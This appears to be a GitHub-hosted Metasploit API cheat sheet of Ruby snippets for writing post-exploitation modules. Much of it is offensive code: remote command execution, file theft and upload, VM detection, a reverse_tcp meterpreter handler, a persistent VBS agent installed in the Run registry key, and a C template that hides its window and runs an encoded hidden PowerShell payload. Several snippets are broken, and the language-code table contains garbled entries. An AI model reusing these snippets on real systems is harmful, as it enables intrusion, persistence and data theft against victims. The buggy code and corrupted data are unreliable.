
## METASPLOIT API CHEAT SHEET

<blockquote>The purpose of this cheat sheet is to describe some common API technics for some of the various components of the Metasploit Framework, to assiste developers into writing metasploit modules. It is worthy to note that the Metasploit has a full-featured Ruby client API Documentation: https://www.rubydoc.info/github/rapid7/metasploit-framework/index</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | API examples |
|-------|---|---|
| Print on terminal | [print messages on terminal](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#print-messages-on-terminal) | print_error("Target its not compatible with this module ...") |
| execute remote commands | [executing remote commands](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#execute-remote-commands) | cmd_exec("chmod 777 #{random_file_path}") |
| stdapi operations | [stdapi operations](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#stdapi-operations) | if client.fs.file.writable?("%tmp%") |
| checking target arch | [checking target system arch](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#check-target-arch) | unless session.platform.include?("linux") |
| various checks | [various checks ](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-checks) | mul = client.framework.exploits.create("multi/handler") |
| ruby string manipulation | [ruby string manipulation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#ruby-string-manipulation) | parse = datastore['remote_path'].gsub('\\','\\\\') |
| listing remote processes | [listing remote processes](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#listting-remote-processes) | session.sys.process.get_processes().each do \|x\| |
| various operations | [various operations](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-operations) | tbl = Rex::Ui::Text::Table.new('') |
| writting exploits | [writting exploits](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#writing-exploits) | exeTEMPLATE = %{ #include <stdio.h> }, |

<br />

## EXTERNAL LINKS

- [Execute Ruby Online (Ruby v2.4.1)](https://www.tutorialspoint.com/execute_ruby_online.php)
- [Rapid7 metasploit-framework API](http://www.rubydoc.info/github/rapid7/metasploit-framework/index)
- [Metasploit-unleashed Writing_Meterpreter_Scripts](http://www.offensive-security.com/metasploit-unleashed/Writing_Meterpreter_Scripts)
- [r00t-3xp10it writing_a_linux_post_module_from_scratch](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/writing_a_linux_post_module_from_scratch.md)

---

<br /><br /><br /><br />

## Print messages on terminal

- **print blue color**

      print_status("module normal functions working.")

- **print green color**

      print_good("Target #{arch} its compatible with this module")

- **print red color**

      print_error("Target #{arch} its not compatible with this module")

- **print yellow color**

      print_warning("Aborting, module can't determine target arch.")

- **print line**

      print_line("Hello from a metasploit session at #{Time.now}")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## EXECUTE REMOTE COMMANDS

- **execute command and display results**

      output = cmd_exec("whoami")
      print_good("whoami: #{output}")

- **execute bash commands (/bin/sh)**

      cmd_exec("mkdir -m 700 -p /root/test.s")
      cmd_exec("sh /root/test.sh")
      system("msfconsole -x 'db_status'")

- **Execute remote command (windows)**

      proc = session.sys.process.execute("cmd.exe /c start calc.exe", nil, {'Hidden' => true})

- **Executing a shell command (not meterpreter)**<br />
'we need to escape the **app_path** var because **sed** command uses **///** as command separator'

      app_path = "/root/payload.sh"
      parse = app_path.gsub('/', '\\/')
      session.shell_command("sed -i 's|@reboot \* \* \* \* root #{parse}||' /etc/crontab")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## STDAPI OPERATIONS

- **simple read file**

      output = read_file("/proc/scsi/scsi")
      print_status("contents: #{output}")

- **delete remote file (windows)**

      client.fs.file.rm("c:\\oldman\\file.txt")

- **rename file**

      client.fs.file.mv("C:\\oldname","C:\\newname")

- **check if file its writeable**

      client.fs.file.writeable?("C:\\Users\\pedro\\Desktop")

- **make a directory named "oldman"**

      client.fs.dir.mkdir("c:\\oldman")

- **Download file from target system**<br />
'This will download dum.txt from taget and save it to attackers root directory'

      client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")

- **upload file to target system**<br />
'This will upload dum.txt from attacker system and save it to target root directory'

      client.fs.file.upload("C:\\Users\\pedro\\Desktop\\dum.txt","/root/dum.txt")

- **random filename (8 caracters)**

      rand = Rex::Text.rand_text_alpha(8)+".log"
      print_good("#{rand} file created")

- **use backslash to escape double quotes or special caracters**

      print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"")

- **write to a local file**

      File = file.open("/root/test", "w")
      File.write("sc create #{sname} binpath= \"C:\\Users\\Desktop\\test.exe\" start= auto") 
      File.close

- **write file with multiple lines (oneliner)**

      File.open("/root/hello.sh", "w") {|f| f.write("#!/bin/sh\necho 'hello iam 1º line'\necho 'hello iam the 2º line'\nsleep 3\nexit") }

- **write to remote file**

      rc_full_path = "/root/ip.sh"
        con_rc << "#!/bin/sh\n"
        con_rc << "ifconfig wlan0"
        file_write(rc_full_path, con_rc)
      print_line("Writing Console RC file to #{rc_full_path}")

- **write to remote file**

      dll_data =
        "#!/bin/sh" +
        "xwd -root-out /tmp/screen.xwd" +
        "exit"
  
      dllpath = "/tmp/screen.xwd"
        fd = session.fs.file.new(dllpath, 'wb')
        fd.write(dll_data)
        fd.close
      print_status("Uploaded the persistent agent to #{dllpath}")

- **write to remote file**

      tempdir = client.fs.file.expand_path("%TEMP%")
        tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
        fd = client.fs.file.new(tempvbs, "wb")
        fd.write(vbs)
        fd.close
      print_status("Uploaded the persistent agent to #{tempvbs}")

- **Open a file in read mode and copy the content to some variable**<br />
'This will copy all the data inside dum.txt and store it in vtemp variable'

      file1 = client.fs.file.new("C:\\Users\\pedro\\Desktp\\dum.txt")
        vtemp = ""
        until file1.eof?
        vtemp << file_object.read
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## CHECK TARGET ARCH

- **check FOR proper operative System**

      if session.platform == 'windows'
      unless session.platform.include?("linux")

- **check FOR proper operative System (windows-not-wine)**

      oscheck = client.fs.file.expand_path("%OS%")
      if not oscheck == "Windows_NT"
        print_error("[ ABORT ]: This module only works againts windows systems")
        return nil
      end

- **check FOR operative System compatible**

      unless sysinfo['OS'] =~ /Windows (xp|vista|9|10)/
        print_error("[ ABORT ]: This module only works againt windows systems.")
        return nil
      end

- **determine target arch (x86|x64)**

      sysarch = sysinfo['Architecture']
        if sysarch == ARCH_X86
          target_compspec = "C:\\Windows\\SysWow64\\cmd.exe"
        else
          target_compspec = "C:\\Windows\\system32\\cmd.exe"
        end

- **determine target distro (linux)**

      target_info = cmd_exec('uname -ms')
      if target_info =~ /linux/ || target_info =~ /Linux/
        print_status("Platform: Linux")
      end



- **another target System check method (windows)**

      def check
        vulnerable = []
          winver = sysinfo["OS"]
          affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            affected.each { |v|
              if winver.include? v
                vulnerable = true
              else
                vulnerable = false
            break
          end
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />


## VARIOUS CHECKS

- **check if remote file exists (windows)**

      print_warning("checking file existance")
      path="C:\\Windows\\system32\\ola.txt"
        if session.fs.file.exist?(path)
          print_good("path: #{path} found ..")
        end

- **check IF application exists (linux)**

      if exists_exe?("wget")
        print_good("wget available, using it ..")
      end

- **check IF directory exists ?????**

      get_path = "C:\\windows"
        if session.fs.dir.exist?(get_path) # error ?? why ???
          print_good('Vuln path exists')
        else
          print_error("#{get_path} doesn't exist on target")
      end

- **check IF directory exists (local)**

      get_path = "/root/payload.sh"
        if not File.directory?(get_path)
          print_error("Remote path: #{get_path} not found ..")
          return nil
        end

- **check IF string inputed contains \\ .**

      if app_path.include? "\\"

- **check IF string does NOT contains any \\ .**

      unless app_path.include? "\\"

- **check if we are in a meterpreter session**

      if not sysinfo.nil?
        print_status("Running module against #{sysnfo['Computer']}")
      end

- **check if sessions its admin**

      isadd = is_admin?
      if(isadd)
        print_line('we are admin') 
      else
        print_line('not admin access level') 
      end

- **check if sessions its system**

      issys = is_system?
      if(issys)
        print_line('we are system') 
      else
        print_line('not a system access level') 
      end

- **List all the available interfaces from victims system**
comment: This will return an array of the first interface available in the victims
system along with the details like IP, netmask, mac_address etc.

      vtemp = "client.net.config.get_interfaces"
      print_good("Interfaces: #{vtemp}")

- **Get target host name**

      def get_host
        case session.type
        when /meterpreter/
          host = sysinfo["Computer"]
        when /shell/
          host = cmd_exec("hostname").chomp
        end
        print_status("Running module against #{host}")
        return host
      end

- **determine if MinGW has been installed, support new and old MinGW system paths**

      mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
      if mingw == false
        print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
        return nil
      end

- **determine if we are in a VM System (windows)**

      if registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion') =~ /vbox/i
        vm = true
      end

      if not vm
        srvvals = registry_enumkeys('HKLM\SYSTEM\ControlSet001\Services')
          if srvvals and srvvals.include?("VBoxMouse")
            vm = true
          elsif srvvals and srvvals.include?("VBoxGuest")
            vm = true
          elsif srvvals and srvvals.include?("VBoxService")
            vm = true
          elsif srvvals and srvvals.include?("VBoxSF")
            vm = true
          end
      end

      if vm
        report_note(
          :host   => session,
          :type   => 'host.hypervisor',
          :data   => { :hypervisor => "VirtualBox" },
          :update => :unique_data
          )
        print_status("This is a Sun VirtualBox Virtual Machine")
        return "VirtualBox"
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## ruby string manipulation


- **use .chomp to delete last char from string**

      s = "hello"
      s.chomp('o')

      output: hell

- **join strings together with .concat()**

      s = "hello"
      s.concat(" world")

      output: hello world

- **string manipulation using .delete() and +**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.delete(".sh")
      mask = rem+"/cron"
      puts mask

      output: /tmp/payload/cron

- **string manipulation using .delete() and .insert()**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.delete(".sh")
      mask = rem.insert(12,"/cron")
      puts mask

      output: /tmp/payload/cron

- **string manipulation (count chars in string)**

      remote_path = "/tmp/payload.sh"
      rem = remote_path.length
      puts rem

      output: 15

 - **string manipulation (subtitute chars global)**

       remote_path = "/tmp/payload.sh"
       rem = remote_path.gsub("a","0")
       puts rem

       output: /tmp/p0ylo0d.sh

- **string manipulation (substitute 1º occurencie)**

       remote_path = "/tmp/payload.sh"
       rem = remote_path.sub("a","0")
       puts rem

       output: /tmp/p0yload.sh

- **substitution of chars using .gsub()**

      app_path = 'C:\windows\system32\calc.exe'
      print_warning("path: #{app_path}")
      print_line("-------------------")

        if app_path.include? "\\"
          final = app_path.gsub('\\', '\\\\\\')
          print_good("final path: #{final}")
        end

      output: C:\\windows\\system32\\calc.exe

- **delete chars from var declarations**

      char = datastore['shellcode'] # '\xfc\xfd\x00'
      output = char.delete "\\"

      output: xfcxfdx00

- **join strings**

      values = ["pow", "ers", "hell"]
      result = values.join
      print_good("concaternate: #{results}")

      output: powershell

- **use .split() [delimiter]**

      values = "pedro ubuntu"
      parse = values.split(' ')
      print_status("output: #{parse}")

      output:
        pedro
        ubuntu

- **use .split() to extract only the field we want**

      values = "pedro ubuntu r00t-3xp10it"
      parse = values.split(' ')[2]

      output: r00t-3xp10it

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## LISTTING REMOTE PROCESSES




# List processes
# We can access the list of processes from “session.sys.process” using “get_processes” method.
# Print processes if it is requested
if listprocesses == TRUE
  print_status('Process list:')
  print_line('')
    session.sys.process.get_processes().each do |x|        
    print_good("#{x['name']} [#{x['pid']}]")    
    end
  print_line('') 
end



## List processes (get process by name)
def get_winlogon
  session.sys.process.get_processes().each do |x|
    if x['name'].downcase == "winlogon.exe"
      print_good("process found ..")
    end
end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## VARIOUS OPERATIONS




## store data in loot
OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
if datastore['STORE_LOOT'] == true
  data_entry = cmd_exec("ifconfig")
  store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
end



## display report note to attacker???
output = client.fs.file.expand_path("%SYSTEMDRIVE%")
report_note(
  :host_name => session,
  :type      => "windows.system.path",
  :data      => output,
  :update    => :unique_data
  )
print_status("System info gather ..")



## start a handler
mul = client.framework.exploits.create("multi/handler")
mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
mul.datastore['LHOST']     = rhost
mul.datastore['LPORT']     = rport
mul.datastore['EXITFUNC']  = 'process'
mul.datastore['ExitOnSession'] = false

mul.exploit_simple(
  'Payload'        => mul.datastore['PAYLOAD'],
  'RunAsJob'       => true
)
end



## try to fill a table ???
          # building table display
          tbl = Rex::Ui::Text::Table.new(
              'Header'  => 'Interfaces Active',
              'Indent'  => 1,
              'Columns' =>
          [
                      'wlan',
                      'lan'
          ])
 
     # Gather target user data
     file1 = client.fs.file.new("%temp%\\dum.txt")
           vtemp = ""
           until file1.eof?
           vtemp << file.read
 
     # Store in tables and print results on screen
     tbl << [vtemp]
     print_line("\n" + tbl.to_s + "\n")

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## WRITING EXPLOITS




## This is my imaginary exploit in ruby
include Msf::Exploit::FILEFORMAT
buf = ""
buf << "A" * 1024
buf << [0x40201f01].pack("V")
buf << "\x90" * 10
buf << payload.encoded
file_create(buf)



## build vbs script
print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
raw  = pay.generate
vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
print_status("Persistent agent script is #{vbs.length} bytes long")



## BUILD C template
exeTEMPLATE = %{
#include <stdio.h>
#include <windows.h>
int shellCode(){
	system("color 63");
	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
	/*
		((Shell Code into the console))
	*/
	return 0;
}
void hide(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow (stealth,0);
}
int main(){
	hide();
	shellCode();
	return 0;
}
},

# write C template to a file
file_temp = File.new("temp.c", "w")
file_temp.write(exeTEMPLATE)
file_temp.close



## This sample demonstrates how a file can be encoded using a framework encoder.
require ’msf/base’
$:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,’lib’))
if (ARGV.empty?)
  puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
  return nil
end



framework = Msf::Simple::Framework.create
begin
  # Create the encoder instance.
  mod = framework.encoders.create(ARGV.shift)
  puts(Msf::Simple::Buffer.transform(mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’))
  rescue
  puts "Error: #{$!}\n\n#{$@.join("\n")}"
end



## write reg key remote
nam = Rex::Text.rand_text_alpha(rand(8)+8)
print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
  if(key)
    key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
    print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
  else
    print_status("Error: failed to open the registry key for writing")
  end
end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

---

def check_firefox_win(path)
    paths  = []
    ffpath = []
    path   = path + "\\Mozilla\\"
    print_status("Checking for Firefox profile in: #{path}")

    stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
    if !stat
      print_error("Firefox was not found (Missing profiles.ini)")
      return
    end

    session.fs.dir.foreach(path) do |fdir|
      #print_status("Found a Firefox directory: #{path + fdir}")
      ffpath << path + fdir
      break
    end

    if ffpath.empty?
      print_error("Firefox was not found")
      return
    end

    #print_status("Locating Firefox profiles")
    path << "Firefox\\Profiles\\"

    # We should only have profiles in the Profiles directory store them all
    begin
      session.fs.dir.foreach(path) do |pdirs|
        next if pdirs == "." or pdirs == ".."
        vprint_good("Found profile: #{path + pdirs}")
        paths << path + pdirs
      end
    rescue
      print_error("Profiles directory is missing")
      return
    end

    paths.empty? ? (nil) : (paths)
  end



# --------------------------------------------------------------



Syntax: client.sys.config.sysinfo["System Language"]
Output: "en_US"
Comment: This will give operating system language of the compromised system.
-----------
REG QUERY HKLM\System\CurrentControlSet\Control\Nls\Language /v InstallLanguage
0436 = "af;Afrikaans"
041C = "sq;Albanian"
0001 = "ar;Arabic"
0401 = "ar-sa;Arabic (Saudi Arabia)"
0801 = "ar-iq;Arabic (Iraq)"
0C01 = "ar-eg;Arabic (Egypt)"
1001 = "ar-ly;Arabic (Libya)"
1401 = "ar-dz;Arabic (Algeria)"
1801 = "ar-ma;Arabic (Morocco)"
1C01 = "ar-tn;Arabic (Tunisia)"
2001 = "ar-om;Arabic (Oman)"
2401 = "ar-ye;Arabic (Yemen)"
2801 = "ar-sy;Arabic (Syria)"
2C01 = "ar-jo;Arabic (Jordan)"
3001 = "ar-lb;Arabic (Lebanon)"
3401 = "ar-kw;Arabic (Kuwait)"
3801 = "ar-ae;Arabic (you.A.E.)"
3C01 = "ar-bh;Arabic (Bahrain)"
4001 = "ar-qa;Arabic (Qatar)"
042D = "eu;Basque"
0402 = "bg;Bulgarian"
0423 = "be;Belarusian"
0403 = "ca;Catalan"
0004 = "zh;Chinese"
0404 = "zh-tw;Chinese (Taiwan)"
0804 = "zh-cn;Chinese (China)"
0C04 = "zh-hk;Chinese (Hong Kong SAR)"
1004 = "zh-sg;Chinese (Singapore)"
041A = "hr;Croatian"
0405 = "cs;Czech"
0406 = "the;Danish"
0413 = "nl;Dutch (Netherlands)"
0813 = "nl-be;Dutch (Belgium)"
0009 = "en;English"
0409 = "en-us;English (United States)"
0809 = "en-gb;English (United Kingdom)"
0C09 = "en-au;English (Australia)"
1009 = "en-ca;English (Canada)"
1409 = "en-nz;English (New Zealand)"
1809 = "en-ie;English (Ireland)"
1C09 = "en-za;English (South Africa)"
2009 = "en-jm;English (Jamaica)"
2809 = "en-bz;English (Belize)"
2C09 = "en-tt;English (Trinidad)"
0425 = "et;Estonian"
0438 = "fo;Faeroese"
0429 = "fa;Farsi"
040B = "fi;Finnish"
040C = "fr;French (France)"
080C = "fr-be;French (Belgium)"
0C0C = "fr-ca;French (Canada)"
100C = "fr-ch;French (Switzerland)"
140C = "fr-lu;French (Luxembourg)"
043C = "gd;Gaelic"
0407 = "de;German (Germany)"
0807 = "de-ch;German (Switzerland)"
0C07 = "de-at;German (Austria)"
1007 = "de-lu;German (Luxembourg)"
1407 = "de-li;German (Liechtenstein)"
0408 = "el;Greek"
040D = "he;Hebrew"
0439 = "hi;Hindi"
040E = "hu;Hungarian"
040F = "is;Icelandic"
0421 = "in;Indonesian"
0410 = "it;Italian (Italy)"
0810 = "it-ch;Italian (Switzerland)"
0411 = "ja;Japanese"
0412 = "ko;Korean"
0426 = "lv;Latvian"
0427 = "lt;Lithuanian"
042F = "mk;FYRO Macedonian"
043E = "ms;Malay (Malaysia)"
043A = "mt;Maltese" 0414 = "no;Norwegian (Bokmal)"
0814 = "no;Norwegian (Nynorsk)"
0415 = "pl;Polish"
0416 = "pt-br;Portuguese (Brazil)"
0816 = "pt;Portuguese (Portugal)"
0417 = "rm;Rhaeto-Romanic"
0418 = "ro;Romanian"
0818 = "ro-mo;Romanian (Moldova)"
0419 = "ru;Russian"
0819 = "ru-mo;Russian (Moldova)"
0C1A = "sr;Serbian (Cyrillic)"
081A = "sr;Serbian (Latin)"
041B = "sk;Slovak"
0424 = "sl;Slovenian"
042E = "sb;Sorbian"
040A = "es;Spanish (Traditional Sort)"
080A = "es-mx;Spanish (Mexico)"
0C0A = "es;Spanish (International Sort)"
100A = "es-gt;Spanish (Guatemala)"
140A = "es-cr;Spanish (Costa Rica)"
180A = "es-pa;Spanish (Panama)"
1C0A = "es-do;Spanish (Dominican Republic)"
200A = "es-ve;Spanish (Venezuela)"
240A = "es-co;Spanish (Colombia)"
280A = "es-pe;Spanish (Peru)"
2C0A = "es-ar;Spanish (Argentina)"
300A = "es-ec;Spanish (Ecuador)"
340A = "es-cl;Spanish (Chile)"
380A = "es-uy;Spanish (Uruguay)"
3C0A = "es-py;Spanish (Paraguay)"
400A = "es-bo;Spanish (Bolivia)"
440A = "es-sv;Spanish (El Salvador)"
480A = "es-hn;Spanish (Honduras)"
4C0A = "es-ni;Spanish (Nicaragua)"
500A = "es-pr;Spanish (Puerto Rico)"
0430 = "sx;Sutu"
041D = "sv;Swedish"
081D = "sv-fi;Swedish (Finland)"
041E = "th;Thai"
0431 = "ts;Tsonga"
0432 = "tn;Tswana"
041F = "tr;Turkish"
0422 = "uk;Ukrainian"
0420 = "your;Urdu"
042A = "vi;Vietnamese"
0434 = "xh;Xhosa"
043D = "ji;Yiddish"
0435 = "zu;Zulu"
-----------

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

EOF
